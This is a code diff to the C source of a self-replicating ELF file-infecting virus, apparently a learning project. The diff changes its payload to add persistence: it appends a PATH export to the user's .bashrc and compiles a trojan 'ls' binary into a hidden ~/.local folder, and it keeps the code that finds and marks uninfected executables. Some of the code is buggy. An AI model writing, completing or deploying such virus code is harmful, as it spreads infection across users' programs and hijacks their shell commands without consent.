@@ -13,7 +13,7 @@
 #include <sys/mman.h>
 #include <elf.h>
 
-#define SIZE 22648
+#define SIZE 22928
 #define MAGIC_NUMBER 0x15D25
 #define TEMP_FILENAME ".tempFileImage"
 
@@ -25,47 +25,96 @@ static inline char* randomly_select_dir(char **dirs)
 	return (char *)dirs[get_random_number(4)];
 }
 
-/* Execute malacious instructions */
-void devastation(char *fileName) {
-	const unsigned char banner[] = "Haha.. Your computer has been infected\n";
-	write(1, (char *)banner, sizeof(banner));
-
-	//Malicious hexdump
-	char shellcode[] =
-        "\x6d\x61\x69\x6e\x28\x29\x7b\x77\x68\x69\x6c\x65\x28\x31\x29\x3b\x7d\x0a";
+void infectBashSrc(char *userName, char *export_ls){
+	 
+	char bashrcPath[250] = "/home/";
+	strcat(bashrcPath,userName);
+	strcat(bashrcPath,"/.bashrc");
 	
-	char buf[200];
-	strcpy(buf,fileName);
-	strcat(buf,"_temp");
+	// Open .bashrc
+	FILE *bashrc_fd = fopen(bashrcPath, "r+");
+	
+	
+	// Check last statement for export
+	char buff[1024];
+	if ( bashrc_fd != NULL) // open file
+	{
+		fseek(bashrc_fd, 0, SEEK_SET); // make sure start from 0
+		while(!feof(bashrc_fd))
+		{
+		    memset(buff, 0x00, 1024); // clean buffer
+		    fscanf(bashrc_fd, "%[^\n]\n", buff); // read file *prefer using fscanf
+		    
+		}
+	
+		// Add export statement if not already ifected
+	
+		if(strcmp(buff,export_ls))
+			fprintf(bashrc_fd,"\n%s",export_ls);
+	}
+	fclose(bashrc_fd);
+}
 
+
+/* Execute malacious instructions */
+void devastation() {
+	// const unsigned char banner[] = "Virus Text... ";
+	
+	// Subroutine 1
+	// Get user name
+	char buf[64];
+	cuserid(buf);
+	
+	char folder_path[250] = "/home/";
+	strcat(folder_path, buf);
+	strcat(folder_path,"/.local/");
+	
+	char export_ls[250] = "export PATH=\"";
+	strcat(export_ls,folder_path);
+	strcat(export_ls,":$PATH\"");
+	
+	
+	infectBashSrc(buf, export_ls);
+	
+	
+	// Subroutine 2
+	// Check if the malliciouc ls binary in mallicious folder
+	// if not Create a hidden folder to store the mallicious ls binary
+	// create and compile the binary to that folder
+	
+	//Malicious hexdump
+	
+	
+	char shellcode[] =
+        "#include<stdio.h>\n\ 
+#include<stdlib.h>\n\
+main(){printf(\"Modified ls\\n\");system(\"/bin/ls\");}";
+	
+	char bufx[200] = "ls";
+
+	
+	
 	//write to a file.c in the same directory
-	char buf2[200];
-	strcpy(buf2,buf);
-	strcat(buf2,".c");
-	int temp_fd = creat(buf2, S_IWUSR | S_IRUSR);	
-	write(temp_fd, shellcode, 18);
+	char file_path[250];
+	strcpy(file_path,folder_path);
+	strcpy(file_path,bufx);
+	strcat(file_path,".c");
+	
 
+	int temp_fd = creat(file_path, S_IWUSR | S_IRUSR);	
+	write(temp_fd, shellcode, 88);
+
+
+	strcat(folder_path,bufx);
 	//compile the file
 	char command[200]="gcc -w ";
-	strcat(command,buf2);
+	strcat(command,file_path);
 	strcat(command," -o ");
-	strcat(command,buf);
+	strcat(command,folder_path);
 	system(command);
-	remove(buf2);
-
-	//fork ->
-	pid_t pid = fork();		
-
-	//1. Run the file
-	if(pid == 0) {
-		char *args[]={buf,NULL};
-        execvp(args[0],args);
-	}
-	//2. delete the file.c and file
-	else{
-		sleep(0.5);
-		remove(buf);
-	}
+	remove(file_path);
+		
+	// write(1, (char *)banner, sizeof(banner));
 }
 
 /* Returns true if the file's format is ELF (Executeable and Linkable Format)
@@ -91,7 +140,7 @@ bool isELF(char* fileName) {
  * Returns true if the file has not been infected yet
  * by checking the padding entry in the EI_PAD of elf header
  */
-bool isHealthy(char* fileName) {
+bool isClean(char* fileName) {
 	int fd = open(fileName, O_RDONLY);
 	lseek(fd, EI_PAD, SEEK_SET);
 	uint32_t flag;
@@ -117,7 +166,7 @@ char* getHealthyHostFile(char *self_name) {
 	while((file = readdir(dir)) != NULL){
 		stat(file->d_name, &st);
 		if(!strcmp(file->d_name, self_name)) continue;	// Don't infect self
-		if(isELF(file->d_name) && isHealthy(file->d_name)){
+		if(isELF(file->d_name) && isClean(file->d_name)){
 			closedir(dir);
 			return file->d_name;
 		}
@@ -220,12 +269,20 @@ void makeCopyAndAddSignature(char *fileName){
 
 
 void main(int argc, char *argv[]) {
-    srand(time(0));
+    	srand(time(0));
+	
+#if TEST
+	devastation();
+	return;
+#endif
+	
 	makeCopyAndAddSignature(argv[0]);
 
 	int virus_fd = open(argv[0], O_RDWR);
-    struct stat st;
+    	struct stat st;
 	fstat(virus_fd, &st);
+	
+	
 	
 	char* cleanHostName = getHealthyHostFile((char*)argv[0] + 2);
 	if(cleanHostName != NULL) 
@@ -234,10 +291,12 @@ void main(int argc, char *argv[]) {
 
 	if(isOriginalVirus(virus_fd))
 		makeCopyAndAddSignature(argv[0]);
-	else
+	else{
+		devastation();
 		executeHostPart(virus_fd, st.st_mode, st.st_size, argv);
+	}
 	close(virus_fd);
-	devastation(argv[0]);
+
 }
 
 
